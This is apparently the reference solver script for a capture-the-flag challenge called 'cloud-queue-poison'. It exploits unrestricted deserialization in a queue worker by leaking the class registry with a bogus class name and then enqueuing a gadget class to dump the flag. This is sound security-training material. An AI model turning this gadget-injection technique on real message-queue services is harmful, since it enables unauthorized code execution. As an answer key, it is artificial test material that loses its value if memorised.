#!/usr/bin/env python3
"""Reference solver for cloud-queue-poison.

The worker deserializes queue messages into registry classes with no allow-list.
Leak the registry via a bogus class, enqueue the FlagDumper gadget, run the
worker, read the results.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.error
import urllib.request


def _req(url, obj=None, method="GET"):
    data = json.dumps(obj).encode() if obj is not None else None
    headers = {"Content-Type": "application/json"} if data else {}
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        return json.loads(urllib.request.urlopen(req, timeout=10).read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read())


def solve(base):
    base = base.rstrip("/")
    probe = _req(base + "/enqueue", {"__class__": "__nope__"}, "POST")
    gadget = next(c for c in probe["registry"] if c != "Notification")
    _req(base + "/enqueue", {"__class__": gadget}, "POST")
    _req(base + "/work", {}, "POST")
    return _req(base + "/results")["results"][-1]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
